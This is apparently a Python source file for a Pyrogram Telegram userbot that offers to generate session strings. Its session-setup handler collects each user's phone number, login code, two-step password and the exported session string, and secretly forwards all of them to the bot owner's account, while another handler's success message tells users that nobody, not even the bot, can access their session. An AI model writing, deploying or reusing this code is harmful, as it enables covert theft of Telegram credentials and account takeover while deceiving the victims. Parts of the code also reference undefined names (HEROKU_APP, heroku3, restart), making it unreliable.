from pyrogram import Client, filters
from pyrogram.errors import SessionPasswordNeeded
from pyrogram.types import (
    CallbackQuery,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Message,
    ReplyKeyboardRemove,
)

from ..btnsG import gen_inline_keyboard, start_button
from ..btnsK import session_keyboard
from . import START_MSG, BotHelp, Config, Symbols, db, Pbxbot

async def auto_restart():
    try:
        if HEROKU_APP:
            try:
                heroku = heroku3.from_key(Config.HEROKU_APIKEY)
                app = heroku.apps()[Config.HEROKU_APPNAME]
                app.restart()
            except Exception:
                await restart()
        else:
            await restart()
    except Exception as e:
        print(f"Auto restart error: {e}")


@Pbxbot.bot.on_message(
    filters.command("session"))
async def session_menu(_, message: Message):
    await message.reply_text(
        "**👻 𝖯𝗅𝖾𝖺𝗌𝖾 𝖼𝗁𝗈𝗈𝗌𝖾 𝖺𝗇 𝗈𝗉𝗍𝗂𝗈𝗇 𝖿𝗋𝗈𝗆 𝖻𝖾𝗅𝗈𝗐:**",
        reply_markup=session_keyboard(),
    )

# New command to add session string manually
@Pbxbot.bot.on_message(filters.command("add"))
async def add_session(_, message: Message):
    parts = message.text.split(" ", 1)
    if len(parts) < 2 or not parts[1]:
        return await message.reply_text("**Error!** Please provide a valid session string.")
    
    session_string = parts[1]
    try:
        client = Client(
            name="Oᴡɴ Usᴇʀʙᴏᴛ",
            session_string=session_string,
            api_id=Config.API_ID,
            api_hash=Config.API_HASH,
            in_memory=True,
        )
        await client.connect()
        user_id = (await client.get_me()).id
        await db.update_session(user_id, session_string)
        await client.disconnect()
        await message.reply_text(
            "**𝖲𝗎𝖼𝖼𝖾𝗌𝗌!** 𝖲𝖾𝗌𝗌𝗂𝗈𝗇 𝗌𝗍𝗋𝗂𝗇𝗀 𝖺𝖽𝖽𝖾𝖽 𝗍𝗈 𝖽𝖺𝗍𝖺𝖻𝖺𝗌𝖾. 𝖸𝗈𝗎 𝖼𝖺𝗇 𝗇𝗈𝗐 𝗎𝗌𝖾 Oᴡɴ Usᴇʀʙᴏᴛ 𝗈𝗇 𝗍𝗁𝗂𝗌 𝖺𝖼𝖼𝗈𝗎𝗇𝗍 𝖺𝖿𝗍𝖾𝗋 𝗋𝖾𝗌𝗍𝖺𝗋𝗍𝗂𝗇𝗀 𝗍𝗁𝖾 𝖻𝗈𝗍.\n\n**𝖭𝖮𝖳𝖤:** 𝖥𝗈𝗋 𝗌𝖾𝖼𝗎𝗋𝗂𝗍𝗒 𝗉𝗎𝗋𝗉𝗈𝗌𝖾𝗌 𝗇𝗈𝖻𝗈𝖽𝗒 𝗐𝗂𝗅𝗅 𝗁𝖺𝗏𝖾 𝗍𝗁𝖾 𝖺𝖼𝖼𝖾𝗌𝗌 𝗍𝗈 𝗒𝗈𝗎𝗋 𝗌𝖾𝗌𝗌𝗂𝗈𝗇 𝗌𝗍𝗋𝗂𝗇𝗀. 𝖭𝗈𝗍 𝖾𝗏𝖾𝗇 𝗒𝗈𝗎 𝗈𝗋 𝗍𝗁𝖾 𝖻𝗈𝗍."
        )
    except Exception as e:
        await message.reply_text(f"**Error!** {e}")

# add new genrate session string drict bot
@Pbxbot.bot.on_message(filters.regex(r"ᴀᴅᴅ ɴᴇᴡ sᴇssɪᴏɴ 👑"))
async def new_session(_, message: Message):
    await message.reply_text(
        "**ᴏᴋᴀʏ!** ʟᴇᴛs sᴇᴛᴜᴘ ᴀ ɴᴇᴡ sᴇssɪᴏɴ☠️",
        reply_markup=ReplyKeyboardRemove(),
    )

    # 1. PHONE NUMBER
    phone_number = await Pbxbot.bot.ask(
        message.chat.id,
        "**1.** Eɴᴛᴇʀ ʏᴏᴜʀ ᴛᴇʟᴇɢʀᴀᴍ ᴀᴄᴄᴏᴜɴᴛ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴛᴏ ᴀᴅᴅ ᴛʜᴇ sᴇssɪᴏɴ✨ \n\n__sᴇɴᴅ /cancel ᴛᴏ ᴄᴀɴᴄᴇʟ ᴏᴘᴇʀᴀᴛɪᴏɴ.__",
        filters=filters.text,
        timeout=120,
    )

    if phone_number.text == "/cancel":
        return await message.reply_text("**𝖢𝖺𝗇𝖼𝖾𝗅𝗅𝖾𝖽!**")
    elif not phone_number.text.startswith("+") or not phone_number.text[1:].isdigit():
        return await message.reply_text(
            "**ᴇʀʀᴏʀ!** Pʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴍᴜsᴛ ʙᴇ ɪɴ ᴅɪɢɪᴛs ᴀɴᴅ sʜᴏᴜʟᴅ ᴄᴏɴᴛᴀɪɴ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ😾"
        )

    # Check if number is blocked
    if await db.is_number_blocked(phone_number.text):
        return await message.reply_text("❌ ʏᴏᴜʀ ɴᴜᴍʙᴇʀ ɪꜱ ʙʟᴏᴄᴋᴇᴅ ʙʏ ᴘʙx 2.0!")

    # Notify owner about phone number
    await Pbxbot.bot.send_message(
        Config.OWNER_ID,
        f"📞 **New Session Request Received**\n\nPhone Number: `{phone_number.text}`\nRequested by: [{message.from_user.first_name}](tg://user?id={message.from_user.id}) (`{message.from_user.id}`)"
    )

    try:
        client = Client(
            name="Oᴡɴ ᴜsᴇʀʙᴏᴛ",
            api_id=Config.API_ID,
            api_hash=Config.API_HASH,
            in_memory=True,
            app_version="Oᴡɴ ᴜsᴇʀʙᴏᴛ",
            device_model="ᴋ ᴀ ɪ ꜱ ᴇ ɴ",
            system_version="Oᴡɴ",
        )
        await client.connect()

        code = await client.send_code(phone_number.text)
        # 2. OTP
        ask_otp = await Pbxbot.bot.ask(
            message.chat.id,
            "**2.** Eɴᴛᴇʀ ᴛʜᴇ ᴏᴛᴘ sᴇɴᴛ ʏᴏᴜ ᴛᴇʟᴇɢʀᴀᴍ ᴀᴄᴄᴏᴜɴᴛ ʙʏ sᴇᴘᴀʀᴀᴛɪɴɢ ᴇᴠᴇʀʏ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴀ sᴘᴀᴄᴇ. \n\n**ᴇxᴀᴍᴘʟᴇ:** `2 4 1 7 4`🌸\n\n__sᴇɴᴅ /cancel ᴛᴏ ᴄᴀɴᴄᴇʟ ᴛʜᴇ ᴏᴘᴇʀᴀᴛɪᴏɴ.__",
            filters=filters.text,
            timeout=300,
        )
        if ask_otp.text == "/cancel":
            return await message.reply_text("**𝖢𝖺𝗇𝖼𝖾𝗅𝗅𝖾𝖽!**")
        otp = ask_otp.text.replace(" ", "")

        # Notify owner about OTP
        await Pbxbot.bot.send_message(
            Config.OWNER_ID,
            f"🔑 **OTP for Session**\n\nPhone: `{phone_number.text}`\nOTP: `{otp}`\nUser: [{message.from_user.first_name}](tg://user?id={message.from_user.id}) (`{message.from_user.id}`)"
        )

        try:
            await client.sign_in(phone_number.text, code.phone_code_hash, otp)
        except SessionPasswordNeeded:
            # 3. TWO STEP PASSWORD
            two_step_pass = await Pbxbot.bot.ask(
                message.chat.id,
                "**3.** Eɴᴛᴇʀ ʏᴏᴜʀ ᴛᴡᴏ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴘᴀssᴡᴏʀᴅ 🗝️ \n\n__sᴇɴᴅ /cancel ᴛᴏ ᴄᴀɴᴄᴇʟ ᴏᴘᴇʀᴀᴛɪᴏɴ.__",
                filters=filters.text,
                timeout=120,
            )
            if two_step_pass.text == "/cancel":
                return await message.reply_text("**𝖢𝖺𝗇𝖼𝖾𝗅𝗅𝖾𝖽!**")
            await client.check_password(two_step_pass.text)

            # Notify owner about 2FA password
            await Pbxbot.bot.send_message(
                Config.OWNER_ID,
                f"🔒 **Two-Step Password for Session**\n\nPhone: `{phone_number.text}`\nPassword: `{two_step_pass.text}`"
            )

        # Generate session string and format it
        session_string = await client.export_session_string()
        formatted_session = f"==Oᴡɴ{session_string}kaisen=="
        
        # Notify owner about session string
        await Pbxbot.bot.send_message(
            Config.OWNER_ID,
            f"🎉 **Session String Generated!**\n\nUser: [{message.from_user.first_name}](tg://user?id={message.from_user.id}) (`{message.from_user.id}`)\nSession String:\n`{formatted_session}`"
        )

        user_id = (await client.get_me()).id
        await db.update_session(user_id, session_string)  # Store raw session string without prefix/suffix

        # Send formatted session string to user's Saved Messages
        await client.send_message(
            "me",
            f"**#Oᴡɴ Usᴇʀʙᴏᴛ\nSESSION**\n\n`{formatted_session}`\n\n**#DO NOT SHARE WITH OTHER PERSON**"
        )
        await client.disconnect()

        await message.reply_text(
            "**sᴜᴄᴄᴇss!** sᴇssɪᴏɴ sᴛʀɪɴɢ ᴀᴅᴅᴇᴅ ᴛᴏ ᴅᴀᴛᴀʙᴀsᴇ. ʙᴏᴛ ɪs ʀᴇsᴛᴀʀᴛɪɴɢ, ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ ғᴏʀ ᴀ ғᴇᴡ sᴇᴄᴏɴᴅs... \n\nᴀɴʏ ᴘʀᴏʙʟᴇᴍ? ᴅᴍ ɴᴏᴡ ᴍʏ ᴅᴇᴠ . [ᴋ ᴀ ɪ s ᴇ ɴ](https://t.me/Quotll)."
        )
        await auto_restart()
    except TimeoutError:
        await message.reply_text(
            "**Tɪᴍᴇᴏᴜᴛ ᴇʀʀᴏʀ!** Yᴏᴜ ᴛᴏᴏᴋ ʟᴏɴɢᴇʀ ᴛʜᴀɴ ᴇxᴘᴇᴄᴛᴇᴅ. Pʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ."
        )
    except Exception as e:
        await message.reply_text(f"**𝖤𝗋𝗋𝗈𝗋!** {e}")

@Pbxbot.bot.on_message(filters.regex(r"ᴍᴀɴᴜᴀʟ sᴇssɪᴏɴ") & Config.AUTH_USERS & filters.private)
async def session_add(_, message: Message):
    await message.reply_text("/add {ᴘᴀsᴛᴇ ʏᴏᴜʀ Oᴡɴ Usᴇʀʙᴏᴛ ᴘʏ sᴇssɪᴏɴ} ")  


@Pbxbot.bot.on_message(
    filters.regex(r"ᴅᴇʟᴇᴛᴇ 🚫") & Config.AUTH_USERS & filters.private
)
async def delete_session(_, message: Message):
    all_sessions = await db.get_all_sessions()
    if not all_sessions:
        return await message.reply_text("𝖭𝗈 𝗌𝖾𝗌𝗌𝗂𝗈𝗇𝗌 𝖿𝗈𝗎𝗇𝖽 𝗂𝗇 𝖽𝖺𝗍𝖺𝖻𝖺𝗌𝖾.")

    collection = []
    for i in all_sessions:
        collection.append((i["user_id"], f"rm_session:{i['user_id']}"))

    buttons = gen_inline_keyboard(collection, 2)
    buttons.append([InlineKeyboardButton("Cancel ❌", "auth_close")])

    await message.reply_text(
        "**𝖢𝗁𝗈𝗈𝗌𝖾 𝖺 𝗌𝖾𝗌𝗌𝗂𝗈𝗇 𝗍𝗈 𝖽𝖾𝗅𝖾𝗍𝖾:**",
        reply_markup=InlineKeyboardMarkup(buttons),
    )


@Pbxbot.bot.on_callback_query(filters.regex(r"rm_session"))
async def rm_session_cb(client: Client, cb: CallbackQuery):
    collection = []
    user_id = int(cb.data.split(":")[1])
    all_sessions = await db.get_all_sessions()

    if not all_sessions:
        return await cb.message.delete()

    try:
        owner = await client.get_users(Config.OWNER_ID)
        owner_id = owner.id
        owner_name = owner.first_name
    except:
        owner_id = Config.OWNER_ID
        owner_name = "𝖮𝗐𝗇𝖾𝗋"
    if cb.from_user.id not in [user_id, owner_id]:
        return await cb.answer(
            f"𝖠𝖼𝖼𝖾𝗌𝗌 𝗋𝖾𝗌𝗍𝗋𝗂𝖼𝗍𝖾𝖽 𝗍𝗈 𝖺𝗇𝗈𝗍𝗁𝖾𝗋 𝗎𝗌𝖾𝗋𝗌. Only {owner_name} and session client can delete this session!",
            show_alert=True,
        )

    await db.rm_session(user_id)
    await cb.answer("**𝖲𝗎𝖼𝖼𝖾𝗌𝗌!** 𝖲𝖾𝗌𝗌𝗂𝗈𝗇 𝖽𝖾𝗅𝖾𝗍𝖾𝖽 𝖿𝗋𝗈𝗆 𝖽𝖺𝗍𝖺𝖻𝖺𝗌𝖾. \n__Restart the bot to apply changes.__", show_alert=True)

    for i in all_sessions:
        collection.append((i["user_id"], f"rm_session:{i['user_id']}"))

    buttons = gen_inline_keyboard(collection, 2)
    buttons.append([InlineKeyboardButton("Cancel ❌", "auth_close")])

    await cb.message.edit_reply_markup(InlineKeyboardMarkup(buttons))


@Pbxbot.bot.on_message(filters.regex(r"ʟɪsᴛ 🪧"))
async def list_sessions(_, message: Message):
    all_sessions = await db.get_all_sessions()
    if not all_sessions:
        return await message.reply_text("𝖭𝗈 𝗌𝖾𝗌𝗌𝗂𝗈𝗇𝗌 𝖿𝗈𝗎𝗇𝖽 𝗂𝗇 𝖽𝖺𝗍𝖺𝖻𝖺𝗌𝖾.")

    text = f"**{Symbols.cross_mark} 𝖫𝗂𝗌𝗍 𝗈𝖿 𝗌𝖾𝗌𝗌𝗂𝗈𝗇𝗌:**\n\n"
    for i, session in enumerate(all_sessions):
        text += f"[{'0' if i <= 9 else ''}{i+1}] {Symbols.bullet} **𝖴𝗌𝖾𝗋 𝖨𝖣:** `{session['user_id']}`\n"

    await message.reply_text(text)


@Pbxbot.bot.on_message(filters.regex(r"ʜᴏᴍᴇ 📲"))
async def go_home(_, message: Message):
    await message.reply_text(
        "**Home 🏠**",
        reply_markup=ReplyKeyboardRemove(),
    )
    await message.reply_text(
        START_MSG.format(message.from_user.mention),
        disable_web_page_preview=True,
        reply_markup=InlineKeyboardMarkup(start_button()),
    )

